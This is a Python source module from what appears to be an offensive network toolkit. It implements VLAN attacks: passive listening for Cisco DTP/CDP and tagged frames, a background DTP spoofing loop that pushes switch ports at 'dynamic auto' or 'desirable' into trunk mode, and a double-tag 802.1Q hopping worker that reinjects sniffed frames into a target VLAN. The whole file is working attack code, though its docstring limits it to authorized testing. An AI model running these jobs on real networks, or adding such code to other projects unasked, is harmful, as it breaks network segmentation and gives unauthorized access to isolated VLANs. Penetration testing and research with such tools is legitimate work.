"""VLAN attack jobs: DTP spoofing and 802.1Q double-tag hopping.

Three capabilities over one attacked segment:

* :meth:`~VlanService.learn` - a bounded, blocking listen on one interface
  that catches Cisco control-plane frames (DTP, CDP) and any 802.1Q-tagged
  frames leaking onto an access port, then reports what the peer looks like
  and which VLAN IDs were observed. Passive reconnaissance; nothing is sent.
* :meth:`~VlanService.dtp_spoof` - a background job that periodically sends a
  DTP hello claiming a compatible trunking mode (``desirable`` by default,
  optionally ``trunk``) so a switch port stuck at ``dynamic auto`` /
  ``dynamic desirable`` flips to a trunk. Not a MiTM by itself - it only
  changes what the port *is*; sending tagged frames into the newly-open
  VLANs afterwards is what actually reaches them.
* :meth:`~VlanService.hop` - a background job that runs a sniffer on one
  interface, watches for outbound frames destined to a given target IP that
  the host itself is emitting, and reinjects each match wrapped in two
  stacked 802.1Q tags (outer = native VLAN of the trunk, inner = target
  VLAN). The double-tag technique is one-way and depends on the attacker's
  access port being assigned to the trunk's native VLAN; see the ``hop``
  action's help text.

Jobs are keyed by ``(kind, iface, extra)`` so several may run at once as
long as they differ in some field: one ``dtp-spoof`` per interface, and one
``hop`` per (interface, target-ip) pair. :meth:`~VlanService.stop_all` ends
every running job at once - there is no per-job stop by design; see the
top-level ``tasks`` view for the individual identities. Injection requires
root; the CLI gates the actions. For authorized security testing only.
"""

from __future__ import annotations

import ipaddress
import re
import threading
import time
from collections import Counter
from dataclasses import dataclass, field
from typing import TYPE_CHECKING

from scapy.layers.l2 import Dot1Q, Ether

from mac_and_seize.core.errors import ModuleError
from mac_and_seize.modules.lan.vlan import protocol
from mac_and_seize.net.adapters import netifaces_io, scapy_io
from mac_and_seize.observability import get_logger

if TYPE_CHECKING:
    from mac_and_seize.core.context import AppContext

# --- Cadence / bounds --------------------------------------------------------

#: Default :meth:`learn` window. Long enough to catch one full Cisco DTP hello
#: cycle in the worst case (last hello sent just before we started listening)
#: while still bounded so the prompt does not feel hung. Users who want a
#: quick sanity check can shorten with ``--timeout``.
_LEARN_TIMEOUT_S = 30.0

#: How many consecutive failed sends end a job on its own (e.g. the interface
#: went down mid-run) instead of spinning forever logging.
_MAX_CONSECUTIVE_FAILURES = 20

#: Cadence of the double-tag reinjector's stop-event check when idle. The
#: sniffer wakes the worker via a callback for each match, so this only
#: bounds how quickly ``stop`` is noticed on a link where the host is silent.
_HOP_TICK_S = 0.5

#: MAC address format (six colon-separated hex bytes).
_MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")

# --- Helpers -----------------------------------------------------------------


def _validate_iface(iface: str) -> str:
    """Return a known interface name or raise :class:`ValueError`."""
    text = (iface or "").strip()
    if not text:
        raise ValueError("Give an interface to operate on.")
    available = scapy_io.available_interfaces()
    if text not in available:
        raise ValueError(
            f"Unknown interface {text!r}. "
            f"Available: {', '.join(available) or 'none'}."
        )
    return text


def _read_iface_mac(iface: str) -> str:
    """Return the interface's own MAC address (lower-case, colon form).

    DTP hellos must carry a stable source MAC (the peer keys its neighbor
    state on it); the double-tag reinjector also needs to know its own MAC to
    build a plausible outer Ethernet header for the tagged copy.
    """
    _ipv4, _ipv6, mac = netifaces_io.read_addresses(iface)
    hardware = next((item for item in (mac.get("addr") or []) if item), None)
    if not hardware or not _MAC_RE.match(str(hardware)):
        raise ModuleError(
            f"Could not read the MAC address of {iface!r}; is the interface up?"
        )
    return str(hardware).lower()


def _validate_ipv4(value: str, *, name: str = "target IP") -> str:
    """Return ``value`` as a canonical IPv4 string or raise :class:`ValueError`."""
    text = (value or "").strip()
    if not text:
        raise ValueError(f"{name} is required.")
    try:
        return str(ipaddress.IPv4Address(text))
    except ValueError as exc:
        raise ValueError(f"Invalid {name} {value!r}: {exc}.") from exc


def _resolve_dtp_status(mode: str | None) -> tuple[bytes, str]:
    """Map a user-facing ``--mode`` to a DTP status byte + human label."""
    text = (mode or "desirable").strip().lower()
    if text == "desirable":
        return protocol.DTP_STATUS_DESIRABLE, "desirable"
    if text == "trunk":
        return protocol.DTP_STATUS_TRUNK, "trunk"
    raise ValueError(
        f"Invalid --mode {mode!r}; expected 'desirable' or 'trunk'."
    )


# --- Job dataclass -----------------------------------------------------------


@dataclass
class _VlanJob:
    """One running VLAN job (``dtp-spoof`` or ``hop``).

    Kept as one type across both kinds so the job registry, task-manager
    integration, and finalization logic stay a single code path - the
    ``kind``-specific bits live in the worker closure (see :meth:`_run_dtp`
    and :meth:`_run_hop`).
    """

    #: One of ``"dtp-spoof"`` or ``"hop"``. Names the job for the ``tasks``
    #: view and the ``stop`` summary.
    kind: str
    iface: str
    #: Free-form discriminator so several jobs of the same kind can coexist
    #: on the same interface. Empty for ``dtp-spoof`` (one per interface);
    #: the target IP for ``hop`` (one per target).
    extra: str
    stop_event: threading.Event = field(default_factory=threading.Event)
    started_at: float = 0.0
    thread: threading.Thread | None = None
    task: object | None = None
    #: For ``dtp-spoof``: number of DTP hellos sent. For ``hop``: number of
    #: double-tagged frames reinjected.
    sent: int = 0
    #: Sniffer handle used by ``hop`` for the sniff-and-reinject loop.
    #: ``None`` for ``dtp-spoof``.
    sniffer: object | None = None
    #: Human-readable label for the ``stop`` summary and self-end notify. Set
    #: at job creation so both kinds have a uniform display shape.
    label: str = ""

    @property
    def key(self) -> tuple[str, str, str]:
        return (self.kind, self.iface, self.extra)


# --- Service -----------------------------------------------------------------


class VlanService:
    """Session-scoped registry of VLAN jobs (DTP spoofs + double-tag relays)."""

    def __init__(self) -> None:
        self._log = get_logger(__name__)
        self._lock = threading.RLock()
        self._jobs: dict[tuple[str, str, str], _VlanJob] = {}
        self._context: "AppContext | None" = None

    # --- Public API -----------------------------------------------------------

    def learn(
        self,
        context: "AppContext",
        interface: str,
        *,
        timeout: float | None = None,
    ) -> dict:
        """Listen for DTP/CDP/tagged frames on ``interface``; report a summary.

        Blocks for ``timeout`` seconds (default :data:`_LEARN_TIMEOUT_S`, one
        full DTP hello cycle in the worst case) and returns a dict with the
        peer's DTP identity (mode/type/domain/neighbor) if any DTP hello was
        seen, plus a count of CDP frames observed and the set of 802.1Q VLAN
        IDs that appeared on the wire. Raises :class:`ModuleError` if nothing
        control-plane-shaped was seen in the window (either the segment is
        pure IEEE, or the port has DTP/CDP filtered).
        """
        iface = _validate_iface(interface)
        wait = _LEARN_TIMEOUT_S if timeout is None else float(timeout)
        if wait <= 0:
            raise ValueError("--timeout must be a positive number of seconds.")

        latest_dtp: protocol.DtpInfo | None = None
        dtp_count = 0
        cdp_count = 0
        vlans: Counter[int] = Counter()
        seen_lock = threading.Lock()

        def collect(packet) -> None:
            nonlocal latest_dtp, dtp_count, cdp_count
            with seen_lock:
                info = protocol.parse_dtp(packet)
                if info is not None:
                    dtp_count += 1
                    # Keep the freshest hello: the neighbor's advertised mode
                    # can change during the window (e.g. an operator toggles
                    # trunk state), and the latest one describes the port
                    # state we care about now.
                    latest_dtp = info
                    return
                if protocol.is_cdp(packet):
                    cdp_count += 1
                    return
                vlan = protocol.observed_vlan(packet)
                if vlan is not None:
                    vlans[vlan] += 1

        # Two sniffers: one on the Cisco-multicast BPF (DTP/CDP/VTP) and one
        # broad-strokes on 802.1Q tagged frames (VLAN leak evidence on an
        # access port). A single sniffer with a combined filter would need
        # ``or vlan``, which mixes packet-socket semantics awkwardly on some
        # drivers; two independent sniffers keep the BPFs simple.
        scapy_io.refresh_interfaces()
        try:
            control_sniffer = scapy_io.dispatch_sniffer(
                iface, collect, bpf_filter=protocol.bpf_control_plane(),
            )
            tagged_sniffer = scapy_io.dispatch_sniffer(
                iface, collect, bpf_filter="vlan",
            )
            control_sniffer.start()
            tagged_sniffer.start()
        except OSError as exc:
            raise ModuleError(
                f"Could not listen for VLAN traffic on {iface!r}: {exc}"
            ) from exc

        try:
            time.sleep(wait)
        finally:
            self._stop_sniffer(control_sniffer)
            self._stop_sniffer(tagged_sniffer)

        with seen_lock:
            dtp_info = latest_dtp
            dtp_seen = dtp_count
            cdp_seen = cdp_count
            observed_vlans = sorted(vlans.keys())
            tagged_frames = sum(vlans.values())

        if dtp_info is None and cdp_seen == 0 and not observed_vlans:
            raise ModuleError(
                f"No DTP, CDP, or 802.1Q-tagged frames seen on {iface} within "
                f"{wait:g}s. The port may be silent (no Cisco control plane), "
                "or DTP/CDP may be disabled on the neighbor."
            )

        result: dict = {
            "interface": iface,
            "listen window (s)": wait,
            "DTP hellos observed": dtp_seen,
            "CDP frames observed": cdp_seen,
            "tagged frames observed": tagged_frames,
            "VLAN ids seen": (
                ", ".join(str(v) for v in observed_vlans) if observed_vlans else "-"
            ),
        }
        if dtp_info is not None:
            result.update({
                "DTP neighbor MAC": dtp_info.src_mac or "-",
                "DTP neighbor mode": dtp_info.mode_hint,
                "DTP status byte": f"0x{dtp_info.status_byte:02x}",
                "DTP type byte": f"0x{dtp_info.dtp_type_byte:02x}",
                "DTP domain": dtp_info.domain or "(empty)",
                "DTP neighbor field": dtp_info.neighbor_mac or "-",
            })
        else:
            result["DTP neighbor mode"] = (
                "(no DTP seen - port may already be trunk/nonegotiate/access)"
            )
        return result

    def dtp_spoof(
        self,
        context: "AppContext",
        interface: str,
        *,
        mode: str | None = None,
    ) -> str:
        """Start a background DTP hello job on ``interface``.

        Sends one DTP frame every :data:`~mac_and_seize.modules.lan.vlan.\
protocol.DTP_HELLO_S` seconds claiming the given ``mode`` (``desirable`` or
        ``trunk``; default ``desirable``) so a peer at ``dynamic auto`` /
        ``dynamic desirable`` flips the port to trunk. Only one DTP job runs
        per interface at a time; stop every running VLAN job with
        ``lan vlan stop``.
        """
        iface = _validate_iface(interface)
        src_mac = _read_iface_mac(iface)
        status_byte, mode_label = _resolve_dtp_status(mode)
        job = _VlanJob(
            kind="dtp-spoof",
            iface=iface,
            extra="",
            started_at=time.monotonic(),
            label=f"dtp-spoof ({mode_label}) @ {iface}",
        )
        summary = (
            f"DTP spoof started on {iface} as {src_mac} claiming "
            f"'{mode_label}' (sending a DTP hello every "
            f"{protocol.DTP_HELLO_S:g}s). A peer at 'dynamic auto' or "
            f"'dynamic desirable' typically flips to trunk within a few "
            f"hellos. Stop every running VLAN job with 'lan vlan stop'."
        )
        worker = lambda j=job, mac=src_mac, byte=status_byte: self._run_dtp(
            j, src_mac=mac, status_byte=byte,
        )
        return self._start(context, job, worker=worker, summary=summary)

    def hop(
        self,
        context: "AppContext",
        interface: str,
        native_vlan: int,
        inner_vlan: int,
        target_ip: str,
    ) -> str:
        """Start a background double-tag reinjection job on ``interface``.

        Sniffs outbound frames destined to ``target_ip`` and reinjects each
        one wrapped in ``Dot1Q(outer=native_vlan) / Dot1Q(inner=inner_vlan)``.
        The *original* untagged frame still goes out on the wire alongside
        the tagged copy - the kernel has already sent it by the time scapy
        sees it, and there is no way to cancel it in userspace; the tagged
        copy is what hops the trunk. Only one hop job per (interface, target)
        at a time; stop every running VLAN job with ``lan vlan stop``.

        The attack itself only works when: (a) the attacker's port is on the
        trunk's native VLAN so the outer tag is stripped by the first switch,
        (b) the two VLAN IDs differ, and (c) the target lives in
        ``inner_vlan`` on the other side of the trunk. The service checks
        (b); (a) and (c) are the operator's to verify - ``learn`` reports
        the neighbor's DTP mode and any observed VLAN IDs to help.
        """
        iface = _validate_iface(interface)
        src_mac = _read_iface_mac(iface)
        outer = protocol.validate_vlan(native_vlan, name="native VLAN")
        inner = protocol.validate_vlan(inner_vlan, name="target VLAN")
        if outer == inner:
            raise ValueError(
                "Native and target VLAN must differ; double-tagging with "
                "the same VID on both tags is a no-op (the frame arrives "
                "in the same VLAN it left)."
            )
        target = _validate_ipv4(target_ip)
        job = _VlanJob(
            kind="hop",
            iface=iface,
            extra=target,
            started_at=time.monotonic(),
            label=f"hop {outer}->{inner} -> {target} @ {iface}",
        )
        summary = (
            f"VLAN hop started on {iface}: every outbound frame destined to "
            f"{target} (that the host itself emits) is reinjected wrapped in "
            f"Dot1Q({outer}) / Dot1Q({inner}). The original untagged copy "
            f"still goes on the wire; the tagged copy is what hops. Generate "
            f"traffic to {target} (e.g. from another shell) to feed the "
            f"reinjector. Stop every running VLAN job with 'lan vlan stop'."
        )
        worker = lambda j=job, mac=src_mac, o=outer, i=inner, t=target: (
            self._run_hop(j, src_mac=mac, outer_vlan=o, inner_vlan=i, target_ip=t)
        )
        return self._start(context, job, worker=worker, summary=summary)

    def stop_all(self) -> str:
        """Stop every running VLAN job (raises if none are running)."""
        with self._lock:
            self._reap_locked()
            jobs = list(self._jobs.values())
        if not jobs:
            raise ModuleError("No VLAN jobs are running.")
        for job in jobs:  # signal them all first so they wind down together
            job.stop_event.set()
            # For hop jobs the sniffer is the primary blocking piece; stop
            # it here (not just via the event) so its receive thread wakes
            # promptly instead of after its next packet.
            if job.sniffer is not None:
                self._stop_sniffer(job.sniffer)
        totals = {"dtp-spoof": 0, "hop": 0}
        for job in jobs:
            self._join_job(job)
            totals[job.kind] = totals.get(job.kind, 0) + job.sent
        labels = ", ".join(job.label for job in jobs)
        parts: list[str] = []
        if totals.get("dtp-spoof"):
            parts.append(f"{totals['dtp-spoof']} DTP hello(s)")
        if totals.get("hop"):
            parts.append(f"{totals['hop']} tagged frame(s)")
        counts = " and ".join(parts) if parts else "0 frame(s)"
        return (
            f"Stopped {len(jobs)} VLAN job(s): {labels} "
            f"({counts} sent total)."
        )

    # --- Job start / worker plumbing -----------------------------------------

    def _start(
        self,
        context: "AppContext",
        job: _VlanJob,
        *,
        worker,
        summary: str,
    ) -> str:
        """Register ``job`` in the task manager and spawn its worker thread.

        Raises :class:`ModuleError` if a job with the same
        ``(kind, iface, extra)`` key is already running - the caller (a
        service method) has already verified inputs by the time we get here.
        """
        with self._lock:
            self._reap_locked()
            if job.key in self._jobs:
                raise ModuleError(
                    f"A VLAN {job.kind} job is already running for "
                    f"{job.label!r}; stop it first with 'lan vlan stop'."
                )
            self._context = context
            job.thread = threading.Thread(
                target=worker,
                name=f"lan-vlan-{job.kind}-{job.iface}"
                     + (f"-{job.extra}" if job.extra else ""),
                daemon=True,
            )
            job.task = context.tasks.start(
                context.current_command,
                stop=lambda k=job.key: self._stop_key(k),
            )
            self._jobs[job.key] = job
            job.thread.start()
        return summary

    # --- DTP hello worker ----------------------------------------------------

    def _run_dtp(
        self, job: _VlanJob, *, src_mac: str, status_byte: bytes,
    ) -> None:
        """Injection loop for a ``dtp-spoof`` job; always finalizes on exit."""
        failures = 0
        error = False
        try:
            while not job.stop_event.is_set():
                frame = protocol.dtp_hello(src_mac=src_mac, status=status_byte)
                try:
                    scapy_io.send_l2(frame, job.iface)
                    job.sent += 1
                    failures = 0
                except OSError as exc:
                    # Injection can fail transiently (device busy) or hard
                    # (the interface vanished). Debug, not warning - the
                    # loop runs periodically and must not flood the prompt.
                    failures += 1
                    self._log.debug(
                        "VLAN dtp-spoof: send on %s failed: %s",
                        job.iface, exc,
                    )
                    if failures >= _MAX_CONSECUTIVE_FAILURES:
                        self._log.warning(
                            "VLAN dtp-spoof on %s gave up: %d consecutive "
                            "send failures.",
                            job.iface, failures,
                        )
                        error = True
                        break
                job.stop_event.wait(protocol.DTP_HELLO_S)
        except Exception:  # noqa: BLE001 - a crashed worker must still finalize
            self._log.exception(
                "VLAN dtp-spoof worker for %s crashed", job.iface,
            )
            error = True
        finally:
            self._finalize(job, error=error)

    # --- Double-tag reinjection worker ---------------------------------------

    def _run_hop(
        self,
        job: _VlanJob,
        *,
        src_mac: str,
        outer_vlan: int,
        inner_vlan: int,
        target_ip: str,
    ) -> None:
        """Sniff-and-reinject loop for a ``hop`` job; always finalizes on exit.

        The sniffer's ``prn`` callback runs on the sniffer's own thread and
        calls :meth:`_reinject` for each match. This worker thread just
        babysits the sniffer lifecycle and the stop-event.
        """
        error = False

        def on_packet(packet) -> None:
            # Kernel BPF has already filtered to outbound+ip+dst+not-vlan;
            # the ``Dot1Q`` check here is a defensive safety net for drivers
            # that strip 802.1Q into ``PACKET_AUXDATA`` metadata and let the
            # BPF ``not vlan`` clause misfire. Either way, our reinjected
            # frames must not re-trigger us.
            if packet.haslayer(Dot1Q):
                return
            if not packet.haslayer(Ether):
                return
            self._reinject(
                job,
                packet,
                src_mac=src_mac,
                outer_vlan=outer_vlan,
                inner_vlan=inner_vlan,
            )

        scapy_io.refresh_interfaces()
        try:
            sniffer = scapy_io.dispatch_sniffer(
                job.iface,
                on_packet,
                bpf_filter=protocol.bpf_untagged_dst(target_ip),
            )
            job.sniffer = sniffer
            sniffer.start()
        except OSError as exc:
            self._log.warning(
                "VLAN hop on %s: could not open sniffer: %s",
                job.iface, exc,
            )
            self._finalize(job, error=True)
            return

        try:
            while not job.stop_event.is_set():
                # Sniff is running on its own thread; we just wait for the
                # stop signal and check periodically that the sniffer hasn't
                # died out from under us (interface vanished, driver reset).
                job.stop_event.wait(_HOP_TICK_S)
                if not getattr(sniffer, "running", False):
                    self._log.warning(
                        "VLAN hop on %s: sniffer stopped unexpectedly.",
                        job.iface,
                    )
                    error = True
                    break
        except Exception:  # noqa: BLE001 - a crashed worker must still finalize
            self._log.exception(
                "VLAN hop worker for %s crashed", job.iface,
            )
            error = True
        finally:
            self._stop_sniffer(sniffer)
            job.sniffer = None
            self._finalize(job, error=error)

    def _reinject(
        self,
        job: _VlanJob,
        packet,
        *,
        src_mac: str,
        outer_vlan: int,
        inner_vlan: int,
    ) -> None:
        """Wrap one sniffed frame's IP payload in two 802.1Q tags and send.

        The reinjected Ethernet destination is copied from the original frame
        (usually the default-gateway MAC, since ``target_ip`` is off-subnet
        and the kernel routes through the gateway) so the frame follows the
        same egress port on the first switch. The source MAC is our own -
        forging the source here would be pointless as the tagged copy is
        already unambiguously attributable to us.
        """
        try:
            ether = packet[Ether]
        except IndexError:
            return
        payload = ether.payload
        if payload is None:
            return
        dst_mac = str(ether.dst)
        # Preserve the original EtherType on the inner tag - scapy sets it
        # automatically from the payload class, but if the payload came off a
        # raw bytes decoding path we hand it the observed type explicitly.
        inner_type = int(ether.type) if getattr(ether, "type", None) else None
        try:
            frame = protocol.double_tag(
                payload,
                outer_vlan=outer_vlan,
                inner_vlan=inner_vlan,
                src_mac=src_mac,
                dst_mac=dst_mac,
                inner_type=inner_type,
            )
            scapy_io.send_l2(frame, job.iface)
            job.sent += 1
        except OSError as exc:
            self._log.debug(
                "VLAN hop: reinject on %s failed: %s", job.iface, exc,
            )
        except Exception:  # noqa: BLE001 - the sniffer thread must not raise
            self._log.debug(
                "VLAN hop: reinject dropped a malformed frame", exc_info=True,
            )

    # --- Lifecycle ------------------------------------------------------------

    def _finalize(self, job: _VlanJob, *, error: bool) -> None:
        """Drop ``job`` from the registry and report a self-end via notify."""
        with self._lock:
            if self._jobs.get(job.key) is job:
                del self._jobs[job.key]

        context = self._context
        if job.task is not None and context is not None:
            context.tasks.finish(job.task)

        # A user-driven stop (stop_event set by stop_all()) is reported by
        # that command; stay quiet to avoid a duplicate line. A job that
        # ended on its own (repeated send failures / crash / sniffer death)
        # happened while the user is elsewhere, so surface it via the
        # prompt-safe notify channel.
        if job.stop_event.is_set() or context is None:
            return
        if error:
            context.presenter.notify(
                f"VLAN {job.kind} on {job.iface} stopped: injection or "
                f"sniffer failed ({job.sent} frame(s) sent)."
            )

    def _stop_sniffer(self, sniffer) -> None:
        """Stop a sniffer, tolerating one that never fully started."""
        try:
            if getattr(sniffer, "running", False):
                sniffer.stop()
        except Exception:  # noqa: BLE001 - teardown must not raise at the prompt
            self._log.debug("VLAN: sniffer stop failed", exc_info=True)

    def _stop_key(self, key: tuple[str, str, str]) -> None:
        """Stop the job identified by ``key`` (used as a task-registry stop hook)."""
        with self._lock:
            self._reap_locked()
            job = self._jobs.get(key)
        if job is None:
            return
        if job.sniffer is not None:
            self._stop_sniffer(job.sniffer)
        self._join_job(job)

    def _reap_locked(self) -> None:
        """Drop jobs whose worker already exited (defensive: workers self-remove)."""
        dead = [
            key
            for key, job in self._jobs.items()
            if job.thread is not None and not job.thread.is_alive()
        ]
        for key in dead:
            self._jobs.pop(key, None)

    def _join_job(self, job: _VlanJob) -> None:
        """Signal ``job`` and wait for its worker (which finalizes) to finish."""
        job.stop_event.set()
        thread = job.thread
        if (
            thread is not None
            and thread.is_alive()
            and thread is not threading.current_thread()
        ):
            thread.join(timeout=3.0)
